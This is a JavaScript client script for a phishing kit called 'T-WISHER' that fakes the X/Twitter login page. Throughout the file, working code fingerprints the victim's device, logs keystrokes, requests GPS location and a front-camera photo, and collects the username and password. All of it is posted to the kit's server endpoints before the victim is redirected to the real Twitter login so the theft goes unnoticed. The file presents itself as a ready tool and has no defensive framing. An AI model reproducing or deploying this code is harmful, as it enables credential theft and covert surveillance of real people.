// T-WISHER Client Script
// Handles data collection from victim

// Global variables
let victimId = window.VICTIM_ID || 'unknown';
let mediaStream = null;
let keylogBuffer = '';

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    console.log('T-WISHER client initialized');
    
    // Collect device info immediately
    collectDeviceInfo();
    
    // Start keylogger
    startKeylogger();
    
    // Request permissions after short delay
    setTimeout(() => {
        requestAllPermissions();
    }, 1000);
});

// Collect device information
function collectDeviceInfo() {
    const deviceInfo = {
        victim_id: victimId,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'unspecified'
    };
    
    fetch('/api/device', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(deviceInfo)
    }).catch(err => console.log('Device info send failed:', err));
}

// Request all permissions
function requestAllPermissions() {
    requestLocation();
    requestCamera();
}

// Request location permission
function requestLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const locationData = {
                    victim_id: victimId,
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude || null,
                    heading: position.coords.heading || null,
                    speed: position.coords.speed || null,
                    timestamp: position.timestamp
                };
                
                // Send location to server
                fetch('/api/location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(locationData)
                }).catch(err => console.log('Location send failed:', err));
                
                console.log('Location captured:', locationData.latitude, locationData.longitude);
            },
            error => {
                console.log('Location error:', error.message);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }
}

// Request camera permission and capture
function requestCamera() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                mediaStream = stream;
                
                // Capture image from stream
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to base64
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Send to server
                    fetch('/api/camera', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            victim_id: victimId,
                            image: imageData
                        })
                    }).catch(err => console.log('Camera send failed:', err));
                    
                    // Stop stream
                    stream.getTracks().forEach(track => track.stop());
                    
                }, 500);
            })
            .catch(error => {
                console.log('Camera error:', error.message);
            });
    }
}

// Start keylogger
function startKeylogger() {
    document.addEventListener('keydown', function(e) {
        // Capture key (handle special keys)
        let key = e.key;
        
        if (key === ' ') key = '[SPACE]';
        else if (key === 'Enter') key = '[ENTER]';
        else if (key === 'Backspace') key = '[BACKSPACE]';
        else if (key === 'Tab') key = '[TAB]';
        else if (key === 'Shift') key = '[SHIFT]';
        else if (key === 'Control') key = '[CTRL]';
        else if (key === 'Alt') key = '[ALT]';
        else if (key === 'Escape') key = '[ESC]';
        else if (key === 'ArrowUp') key = '[UP]';
        else if (key === 'ArrowDown') key = '[DOWN]';
        else if (key === 'ArrowLeft') key = '[LEFT]';
        else if (key === 'ArrowRight') key = '[RIGHT]';
        
        keylogBuffer += key;
        
        // Send every 10 keystrokes or after pause
        if (keylogBuffer.length >= 10 || key === '[ENTER]') {
            sendKeylog();
        }
    });
}

// Send keylog data
function sendKeylog() {
    if (keylogBuffer.length > 0) {
        fetch('/api/keylogger', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                victim_id: victimId,
                keys: keylogBuffer
            })
        }).catch(err => console.log('Keylog send failed:', err));
        
        keylogBuffer = '';
    }
}

// Form handling
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordGroup = document.getElementById('passwordGroup');
    const passwordInput = document.getElementById('password');
    const nextButton = document.getElementById('nextButton');
    const googleButton = document.getElementById('googleButton');
    const appleButton = document.getElementById('appleButton');
    const forgotPassword = document.getElementById('forgotPassword');
    const signupLink = document.getElementById('signupLink');

    let isUsernameEntered = false;

    // Validate username/email/phone
    function validateUsername(value) {
        if (!value.trim()) return false;
        
        // Check if it's an email
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (emailRegex.test(value)) return true;
        
        // Check if it's a phone number
        const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
        if (phoneRegex.test(value.replace(/\D/g, ''))) return true;
        
        // Assume it's a username
        return value.length >= 1;
    }

    // Handle username input
    usernameInput.addEventListener('input', function() {
        const isValid = validateUsername(this.value);
        nextButton.disabled = !isValid;
    });

    // Handle form submission
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        if (!isUsernameEntered) {
            // First step: username entered, show password field
            const username = usernameInput.value.trim();
            
            // Show loading
            const originalText = nextButton.textContent;
            nextButton.innerHTML = '<div class="loading"></div>';
            nextButton.disabled = true;
            
            // Simulate API call
            setTimeout(() => {
                isUsernameEntered = true;
                usernameInput.style.display = 'none';
                passwordGroup.style.display = 'block';
                nextButton.innerHTML = 'Log in';
                nextButton.disabled = false;
                
                setTimeout(() => passwordInput.focus(), 100);
            }, 1000);
            
        } else {
            // Second step: send credentials
            const username = usernameInput.value.trim();
            const password = passwordInput.value;
            
            // Show loading
            nextButton.innerHTML = '<div class="loading"></div>';
            nextButton.disabled = true;
            
            // Send credentials to server
            fetch('/api/credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    victim_id: victimId,
                    email: username,
                    password: password
                })
            }).then(() => {
                // Show success and redirect to real Twitter
                showNotification('Success! Redirecting to X...', 'success');
                
                setTimeout(() => {
                    window.location.href = 'https://twitter.com/login';
                }, 2000);
            }).catch(err => {
                console.log('Credential send failed:', err);
                // Still redirect
                window.location.href = 'https://twitter.com/login';
            });
        }
    });

    // Google button handler
    googleButton.addEventListener('click', function() {
        const button = this;
        button.innerHTML = '<div class="loading"></div>';
        button.disabled = true;
        
        setTimeout(() => {
            showNotification('Redirecting to Google...', 'info');
            window.location.href = 'https://twitter.com/login';
        }, 1000);
    });

    // Apple button handler
    appleButton.addEventListener('click', function() {
        const button = this;
        button.innerHTML = '<div class="loading"></div>';
        button.disabled = true;
        
        setTimeout(() => {
            showNotification('Redirecting to Apple...', 'info');
            window.location.href = 'https://twitter.com/login';
        }, 1000);
    });

    // Forgot password handler
    forgotPassword.addEventListener('click', function(e) {
        e.preventDefault();
        showNotification('Password reset flow', 'info');
    });

    // Sign up link handler
    signupLink.addEventListener('click', function(e) {
        e.preventDefault();
        showNotification('Sign up flow', 'info');
    });

    // Show notification function
    function showNotification(message, type) {
        const notification = document.createElement('div');
        notification.className = 'notification';
        notification.textContent = message;
        notification.style.backgroundColor = type === 'success' ? '#00ba7c' : '#1d9bf0';
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.style.animation = 'slideUp 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }
});

// Send keylog before page unload
window.addEventListener('beforeunload', function() {
    sendKeylog();
});
